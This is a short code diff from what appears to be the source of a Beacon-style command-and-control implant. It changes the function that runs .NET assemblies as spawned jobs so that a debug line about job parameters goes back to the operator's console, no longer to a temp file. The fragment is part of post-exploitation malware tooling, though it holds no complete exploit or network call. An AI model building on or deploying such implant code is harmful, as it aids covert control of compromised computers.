@@ -447,21 +447,10 @@ void command_data_store_execute_assembly(char * buffer, int length, BOOL x86, BO
 	ignoreToken = (inner_type == 70 || inner_type == 71);
 	x86_bc(x86 ? "1" : "8");
 	{
-		char path[MAX_PATH];
 		char line[96];
-		HANDLE hf;
-		DWORD n, nw = 0;
-		n = GetTempPathA(MAX_PATH, path);
-		if (n > 0 && n + 12 < MAX_PATH) {
-			lstrcatA(path, "x86ea.txt");
-			hf = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-			if (hf != INVALID_HANDLE_VALUE) {
-				_snprintf(line, sizeof(line), "inner=%u x86=%d wait=%u off=%u dll=%d plen=%d\r\n",
-					inner_type, (int)x86, wait, offset, dlllen, extra.length);
-				WriteFile(hf, line, (DWORD)lstrlenA(line), &nw, NULL);
-				CloseHandle(hf);
-			}
-		}
+		_snprintf(line, sizeof(line), "inner=%u x86=%d wait=%u off=%u dll=%d plen=%d\n",
+			inner_type, (int)x86, wait, offset, dlllen, extra.length);
+		command_shell_post(line, (int)lstrlenA(line), CALLBACK_OUTPUT, TRUE);
 	}
 	command_job_spawn_logic(jtype, wait, offset, dll, (DWORD)dlllen, extra.buffer, extra.length, desc, dlen, x86, ignoreToken);
 	BeaconDataStoreProtectItem((size_t)index);
